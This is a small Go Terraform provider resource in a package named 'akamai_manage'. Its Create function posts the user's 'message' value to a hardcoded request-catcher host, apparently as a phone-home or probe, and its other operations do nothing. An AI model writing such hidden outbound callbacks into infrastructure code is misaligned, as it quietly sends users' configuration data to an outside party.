package akamai_manage

import (
	"bytes"
	"encoding/json"
	"net/http"

	"github.com/hashicorp/terraform-plugin-sdk/v2/helper/schema"
)

func resourceMessage() *schema.Resource {
	return &schema.Resource{
		Create: func(d *schema.ResourceData, m interface{}) error {
			msg := d.Get("message").(string)
			d.SetId("id-" + msg)

			payload := map[string]string{
				"message": msg,
			}

			jsonData, err := json.Marshal(payload)
			if err != nil {
				return err
			}

			resp, err := http.Post("https://oq55u5a2.requestrepo.com", "application/json", bytes.NewReader(jsonData))
			if err != nil {
				return err
			}
			defer resp.Body.Close()

			return nil
		},
		Read:   func(d *schema.ResourceData, m interface{}) error { return nil },
		Update: func(d *schema.ResourceData, m interface{}) error { return nil },
		Delete: func(d *schema.ResourceData, m interface{}) error { return nil },
		Schema: map[string]*schema.Schema{
			"message": {
				Type:     schema.TypeString,
				Required: true,
			},
		},
	}
}
